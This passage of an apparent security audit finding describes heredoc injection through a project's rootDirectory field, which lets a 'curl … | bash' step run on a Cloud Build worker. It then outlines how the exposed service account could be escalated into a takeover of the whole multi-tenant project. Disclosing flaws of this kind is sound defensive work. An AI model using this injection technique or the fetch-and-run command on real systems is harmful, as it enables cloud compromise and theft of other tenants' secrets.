Then they click Deploy (src/app/api/projects/[id]/deploy/route.ts:197 forwards `rootDirectory: project.rootDirectory`). The generated Dockerfile text now contains a line that is exactly `EOFMARKER`, terminating the heredoc at cloudbuild.ts:232 early. Everything after it is no longer Dockerfile content — it is parsed as bash by the `gcr.io/cloud-builders/docker` step, so `curl … | bash` runs directly on the Cloud Build worker, outside any `docker build` container.
findings.impact: Escape from 'my build code runs in a sandboxed docker build layer' to 'arbitrary shell in the platform's Cloud Build step', which has the Docker daemon socket and the GCE metadata server for the platform's shared Cloud Build service account. That service account demonstrably holds project-level IAM-binding rights (cloudbuild.ts:335-342 calls `gcloud projects add-iam-policy-binding` and `gcloud secrets add-iam-policy-binding` on the platform project), so the attacker can mint themselves Owner, read every tenant's Secret Manager secrets, and pull/poison every other customer's images in Artifact Registry. Full multi-tenant GCP project takeover from an ordinary user account.
findings.checked_mitigations: Grepped the full chain: POST /api/projects and PATCH /api/projects/[id] both call getSession()/checkProjectAccess but neither applies any regex or character filter to rootDirectory.
